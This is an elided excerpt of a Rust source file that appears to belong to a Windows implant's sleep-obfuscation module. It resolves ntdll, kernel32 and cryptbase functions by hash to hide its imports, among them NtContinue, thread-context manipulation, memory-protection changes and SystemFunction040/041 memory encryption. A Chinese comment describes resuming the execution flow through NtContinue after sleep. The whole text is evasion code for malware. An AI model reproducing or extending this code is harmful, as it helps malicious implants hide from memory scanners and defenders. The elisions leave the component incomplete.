...
use crate::winapis::{Dll, Modules, WinApi};
use crate::{debug_log, stealth_bail}; // replace anyhow
use core::ptr::null_mut;
use puerto::hash::{fnv1a_utf16, fnv1a_utf16_from_u8};
use puerto::module::{get_module_address, get_ntdll_address, get_proc_address};
use puerto::winapis::{NT_SUCCESS, NtCurrentProcess};
...
pub struct Config {
    ...
    /// 休眠结束后,触发ntcontinue,继续执行hyponus.rs中timer()/wait()中定义好的执行流.
    pub callback: u64,
...
impl Config {
    ...
    fn modules() -> Modules {
        ...
        // 处理cryptbase可能未加载的情况
        let load_library = get_proc_address(kernel32, Some(1290174399u32), Some(fnv1a_utf16))
            .unwrap_or(null_mut());
        let cryptbase = {
            let mut addr =
                get_module_address(Some(1145924862u32), Some(fnv1a_utf16)).unwrap_or(null_mut());
    ...
    fn winapis(modules: Modules) -> Self {
        ...
        Self {
            modules,
            wait_for_single: get_proc_address(
                Some(kernel32),
                Some(474226840u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            base_thread: get_proc_address(Some(kernel32), Some(4144453610u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            enum_date: get_proc_address(Some(kernel32), Some(2305293355u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            system_function040: get_proc_address(
                Some(cryptbase),
                Some(4252924884u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            system_function041: get_proc_address(
                Some(cryptbase),
                Some(2396840837u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            nt_continue: get_proc_address(Some(ntdll), Some(2043420876u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            rtl_capture_context: get_proc_address(
                Some(ntdll),
                Some(1541026118u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            nt_set_event: get_proc_address(Some(ntdll), Some(2314183347u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            rtl_user_thread: get_proc_address(Some(ntdll), Some(1924285810u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            nt_protect_virtual_memory: get_proc_address(
                Some(ntdll),
                Some(399609846u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            rtl_exit_user_thread: get_proc_address(
                Some(ntdll),
                Some(1491200690u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            nt_set_context_thread: get_proc_address(
                Some(ntdll),
                Some(2907677246u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            nt_get_context_thread: get_proc_address(
                Some(ntdll),
                Some(268078698u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            nt_test_alert: get_proc_address(Some(ntdll), Some(1663868085u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            nt_wait_for_single: get_proc_address(
                Some(ntdll),
                Some(1015357890u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            rtl_acquire_lock: get_proc_address(Some(ntdll), Some(105262326u32), Some(fnv1a_utf16))
                .unwrap_or(null_mut())
                .into(),
            tp_release_cleanup: get_proc_address(
                Some(ntdll),
                Some(1421224806u32),
                Some(fnv1a_utf16),
            )
            .unwrap_or(null_mut())
            .into(),
            zw_wait_for_worker: get_proc_address(
                Some(ntdll),
                Some(2438784615u32),
                Some(fnv1a_utf16),
            )
